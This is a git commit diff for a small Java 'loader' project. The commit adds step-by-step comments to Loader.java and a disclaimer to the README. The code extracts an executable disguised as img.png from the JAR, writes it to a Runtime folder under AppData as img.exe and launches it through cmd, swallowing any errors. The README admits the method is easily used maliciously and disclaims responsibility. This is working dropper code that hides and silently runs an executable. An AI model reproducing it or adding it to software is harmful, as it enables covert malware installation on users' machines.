cc49038b1eb86391a3e7303dd5feef8f59c6c7a2
Mythological <justcausemyth@gmail.com>
2021-07-04 16:45:58 -0700

    Comment Code, Fair Use, VT Scan
    made java code commented, added malicious use comments to readme, and also a VT Scan

--- Loader.java
+++ Loader.java
@@ -7,30 +7,41 @@ import java.io.InputStream;
 public class Loader {
 
 	public static void main(String[] args) {
-		final String path = System.getProperty("user.home") + "\\AppData\\Roaming\\Runtime";
-        final File Fpath = new File(path);
-        Fpath.mkdirs();
-        final File exeFile = new File(path + "\\img.exe");
-		InputStream s = Loader.class.getClassLoader().getResourceAsStream("img.png");
+	    //Get users AppData path
+		final String runtimePath = System.getProperty("user.home") + "\\AppData\\Roaming\\Runtime";
+        final File filePath = new File(runtimePath);
+        //Make a new folder called Runtime
+        filePath.mkdirs();
+        //Setup exe path
+        final File exeFile = new File(runtimePath + "\\img.exe");
+        //Get the png as a stream
+		InputStream is = Loader.class.getClassLoader().getResourceAsStream("img.png");
         FileOutputStream fos;
 		try {
+		    //Make an output stream in order to write to the new exe
 			fos = new FileOutputStream(exeFile);
-	        Loader.writeFile(s, fos);
+			//Write
+	        Loader.writeFile(is, fos);
 		} catch (FileNotFoundException e1) {
 			e1.printStackTrace();
 		}
         try {
+            //Run new file
 			Runtime.getRuntime().exec("cmd /k start " + exeFile.getAbsolutePath());
 		} catch (IOException e) {
 		}
 	}
     public static void writeFile(final InputStream is, final FileOutputStream fos) {
         try {
+            //Allocate bytes used to read/write
             final byte[] bytes = new byte[1000];
+            //Counter var
             int k = 0;
+            //While input stream isnt over, write to output stream
             while ((k = is.read(bytes)) != -1) {
                 fos.write(bytes, 0, k);
             }
+            //When done, close output stream
             fos.close();
         }
         catch (Exception ex) {}
--- README.md
+++ README.md
@@ -17,6 +17,12 @@ These are all the files in the repo and their use.
 | img.png | An executable that just displays a couple message boxes, renamed to a .png. |
 | Reflective.cs| The C# class that powers the exe. |
 
+## Goals/Purpose
+I originally intended on making this piece of code because it is an extremely effiencient way to package multiple files into one JAR,
+especially if installing things onto a users computer, this can act as a folder while also providing a hassle-free way to reflect.
 
+Although, like all things, this can very easily be used maliciously, so with that, I am in no way responsible for any of your actions with this code.
+Also, if used maliciously, [VirusTotal](https://virustotal.com) would be able to detect that there is a file in the jar that is malicious.
+Here is this JAR's VT Scan: [Scan](https://www.virustotal.com/gui/file/f6ab2631b950d9b9fb1197dfa33ef43db588917aeba0f3828573b49bf54763bf/detection)
 ## License
 [MIT](https://github.com/CadeCodes/JRRL/blob/main/LICENSE)
